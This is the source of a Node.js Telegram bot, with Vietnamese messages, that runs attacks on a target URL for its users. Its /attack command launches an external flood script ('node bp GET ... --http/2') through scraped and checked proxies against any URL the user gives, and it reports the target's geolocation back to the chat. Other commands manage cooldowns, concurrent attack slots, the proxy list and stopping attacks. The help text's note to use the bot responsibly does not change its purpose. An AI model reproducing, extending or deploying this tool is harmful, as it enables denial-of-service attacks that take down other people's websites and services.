const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');
const dns = require('dns').promises;
const os = require('os');
const net = require('net');
const config = require('./config');

const bot = new TelegramBot(config.TOKEN, { polling: true });

let botLocked = false;
const userCooldown = {};
const activeAttacks = {};
const userSlots = {};

async function resolveDomainToIP(domain) {
  try {
    const addresses = await dns.lookup(domain);
    return addresses.address;
  } catch {
    return null;
  }
}

function checkProxy(proxy) {
  return new Promise((resolve) => {
    const [host, port] = proxy.split(':');
    const socket = net.connect(port, host, () => {
      socket.destroy();
      resolve(true);
    });
    socket.setTimeout(5000);
    socket.on('error', () => resolve(false));
    socket.on('timeout', () => {
      socket.destroy();
      resolve(false);
    });
  });
}

bot.onText(/\/getprx/, async (msg) => {
  const chatId = msg.chat.id;
  if (!config.ADMINS.includes(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Bạn không có quyền.");
  }

  bot.sendMessage(chatId, "⏳ Đang tải và kiểm tra proxy...");

  try {
    let allProxies = [];
    for (const url of config.PROXY_SOURCES) {
      try {
        const res = await axios.get(url, { timeout: 10000 });
        const proxies = res.data.split('\n').map(p => p.trim()).filter(p => p);
        allProxies.push(...proxies);
      } catch (e) {
        console.error(`❌ Không thể tải từ: ${url}`, e.message);
      }
    }

    allProxies = [...new Set(allProxies)].slice(0, 200); // Giới hạn 200 proxy đầu tiên

    const results = await Promise.allSettled(
      allProxies.map(p =>
        Promise.race([
          checkProxy(p),
          new Promise(res => setTimeout(() => res(false), 5000))
        ])
      )
    );

    const liveProxies = allProxies.filter((_, i) => results[i].status === 'fulfilled' && results[i].value);
    fs.writeFileSync('prx.txt', liveProxies.join('\n'));
    bot.sendMessage(chatId, `✅ Đã cập nhật proxy. Tổng cộng: ${liveProxies.length} proxy live.`);
  } catch (err) {
    console.error("❌ Lỗi tải proxy:", err.message);
    bot.sendMessage(chatId, "❌ Lỗi khi tải proxy.");
  }
});

bot.onText(/\/attack (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.first_name || "User";
  const args = match[1].split(" ");

  if (botLocked) return bot.sendMessage(chatId, "❌ Bot hiện tại đã bị khóa.");
  if (args.length < 3) return bot.sendMessage(chatId, "Dùng: /attack <url> <port> <time>");

  const [urlInput, port, timeStr] = args;
  const time = parseInt(timeStr);

  // Check cooldown
  const now = Date.now();
  if (!config.ADMINS.includes(userId)) {
    if ((now - (userCooldown[userId] || 0)) < config.COOLDOWN_MS) {
      const wait = Math.ceil((config.COOLDOWN_MS - (now - userCooldown[userId])) / 1000);
      return bot.sendMessage(chatId, `❌ Vui lòng đợi ${wait}s để tiếp tục.`);
    }
    userCooldown[userId] = now;

    if (time > config.MAX_ATTACK_TIME) {
      return bot.sendMessage(chatId, `❌ Thời gian tấn công tối đa: ${config.MAX_ATTACK_TIME}s.`);
    }

    const current = userSlots[userId] || 0;
    if (current >= config.MAX_CONCURRENTS) {
      return bot.sendMessage(chatId, `❌ Bạn chỉ được chạy tối đa ${config.MAX_CONCURRENTS} tiến trình.`);
    }
  }

  if (!fs.existsSync("prx.txt")) return bot.sendMessage(chatId, `❌ Không tìm thấy file proxy: prx.txt`);

  const domain = urlInput.replace(/https?:\/\//, '').split('/')[0];
  const resolvedIP = await resolveDomainToIP(domain);
  if (!resolvedIP) return bot.sendMessage(chatId, `❌ Không thể resolve IP từ: ${domain}`);

  const cmd = `node bp GET ${urlInput} ${time} 30 128 prx.txt  --http/2`;
  const process = exec(cmd);
  activeAttacks[userId] = process;
  userSlots[userId] = (userSlots[userId] || 0) + 1;

  // Tự giảm slot sau khi tấn công xong
  setTimeout(() => {
    if (activeAttacks[userId]) {
      activeAttacks[userId].kill();
      delete activeAttacks[userId];
    }
    userSlots[userId] = Math.max((userSlots[userId] || 1) - 1, 0);
  }, time * 1000);

  try {
    const ipInfo = await axios.get(`http://ip-api.com/json/${resolvedIP}`);
    const info = {
      Username: username,
      Host: urlInput,
      Port: port,
      Time: time,
      Country: ipInfo.data.country || "Unknown",
      City: ipInfo.data.city || "Unknown",
      isp: ipInfo.data.isp || "Unknown",
      org: ipInfo.data.org || "Unknown",
      as: ipInfo.data.as || "Unknown",
      region: ipInfo.data.regionName || "Unknown",
      zip: ipInfo.data.zip || "Unknown",
      query: ipInfo.data.query || "Unknown"
    };
    bot.sendMessage(chatId, "```json\n" + JSON.stringify(info, null, 2) + "\n```", { parse_mode: "Markdown" });
  } catch {
    bot.sendMessage(chatId, "```json\n" + JSON.stringify({
      Username: username,
      Host: urlInput,
      Port: port,
      Time: time,
      isp: "Unknown",
      query: resolvedIP
    }, null, 2) + "\n```", { parse_mode: "Markdown" });
  }
});

// Lệnh /help
bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  const helpMessage = `
🎉 **Danh sách các lệnh của bot:**

1️⃣ **/getprx**  
   Tải và kiểm tra proxy từ các nguồn. Cập nhật proxy vào file **prx.txt**.

2️⃣ **/attack <url> <port> <time>**  
   Tấn công mục tiêu với URL, cổng và thời gian xác định.  
   Ví dụ: \`/attack http://example.com 80 60\` (tấn công đến http://example.com, cổng 80, trong 60 giây).

3️⃣ **/ongoing**  
   Kiểm tra các tiến trình tấn công đang diễn ra. Hiển thị các tiến trình và thông tin về người dùng và tiến trình.

4️⃣ **/stopall**  
   Dừng tất cả tiến trình tấn công đang diễn ra.

5️⃣ **/lockbot**  
   Khóa bot, ngừng tiếp nhận các lệnh tấn công.

6️⃣ **/unlockbot**  
   Mở khóa bot, cho phép tiếp tục các lệnh tấn công.

❓ **Các lệnh chỉ có thể sử dụng bởi Admin:**
   - **/getprx** - Cập nhật proxy.
   - **/stopall** - Dừng tất cả tiến trình.
   - **/lockbot** - Khóa bot.
   - **/unlockbot** - Mở khóa bot.

💡 **Lưu ý:** Bạn có thể dùng lệnh **/attack** để bắt đầu tấn công và **/help** để lấy thông tin về các lệnh.

⚠️ **Cảnh báo:** Hãy sử dụng bot một cách có trách nhiệm và tuân thủ các quy định pháp luật.

👉 **Chúc bạn sử dụng bot thành công!**
  `;
  bot.sendMessage(chatId, helpMessage, { parse_mode: 'Markdown' });
});

// Lệnh /ongoing
bot.onText(/\/ongoing/, (msg) => {
  const chatId = msg.chat.id;
  if (!config.ADMINS.includes(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Bạn không có quyền.");
  }

  let ongoingMessage = "📋 **Các tiến trình tấn công đang diễn ra:**\n";
  for (const [userId, process] of Object.entries(activeAttacks)) {
    ongoingMessage += `\n👤 User: ${userId}\n💻 Process ID: ${process.pid}\n`;
  }

  if (Object.keys(activeAttacks).length === 0) {
    ongoingMessage += "❌ Không có tiến trình tấn công nào đang diễn ra.";
  }

  bot.sendMessage(chatId, ongoingMessage, { parse_mode: "Markdown" });
});

// Lệnh /stopall
bot.onText(/\/stopall/, (msg) => {
  const chatId = msg.chat.id;
  if (!config.ADMINS.includes(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Bạn không có quyền.");
  }

  for (const process of Object.values(activeAttacks)) {
    process.kill();
  }
  activeAttacks = {};

  bot.sendMessage(chatId, "✅ Đã dừng tất cả tiến trình tấn công.");
});

// Lệnh /lockbot
bot.onText(/\/lockbot/, (msg) => {
  const chatId = msg.chat.id;
  if (!config.ADMINS.includes(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Bạn không có quyền.");
  }

  botLocked = true;
  bot.sendMessage(chatId, "✅ Bot đã bị khóa, không nhận lệnh tấn công.");
});

// Lệnh /unlockbot
bot.onText(/\/unlockbot/, (msg) => {
  const chatId = msg.chat.id;
  if (!config.ADMINS.includes(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Bạn không có quyền.");
  }

  botLocked = false;
  bot.sendMessage(chatId, "✅ Bot đã được mở khóa.");
});


// Lệnh /status
bot.onText(/\/status/, async (msg) => {
  const chatId = msg.chat.id;

  // Lấy thông tin về hệ thống
  const uptime = os.uptime(); // uptime của hệ thống
  const cpuCount = os.cpus().length; // Số cores CPU
  const totalMemory = os.totalmem() / (1024 * 1024 * 1024); // Tổng bộ nhớ RAM (GB)
  const freeMemory = os.freemem() / (1024 * 1024 * 1024); // Bộ nhớ RAM còn trống (GB)

  // Lấy tải hệ thống (CPU usage)
  const loadAvg = os.loadavg(); // 1, 5, 15 phút
  const cpuUsage = (loadAvg[0] / cpuCount) * 100; // Sử dụng CPU trung bình trong 1 phút, chia cho số cores

  // Tạo thông tin về trạng thái hệ thống
  const statusMessage = `
💬 **Trạng thái hệ thống:**
  
🕒 **Uptime:** ${Math.floor(uptime / 60)} phút, ${Math.floor(uptime % 60)} giây
🖥️ **Số cores CPU:** ${cpuCount}
💻 **Tỷ lệ sử dụng CPU (1 phút):** ${cpuUsage.toFixed(2)}%
🧠 **Tổng bộ nhớ RAM:** ${totalMemory.toFixed(2)} GB
💡 **Bộ nhớ RAM còn trống:** ${freeMemory.toFixed(2)} GB

---

💡 **Thông tin thêm:**
- Lệnh /help để xem danh sách các lệnh.
- Lệnh /ongoing để xem các tiến trình tấn công đang diễn ra.
  `;
  
  bot.sendMessage(chatId, statusMessage, { parse_mode: 'Markdown' });
});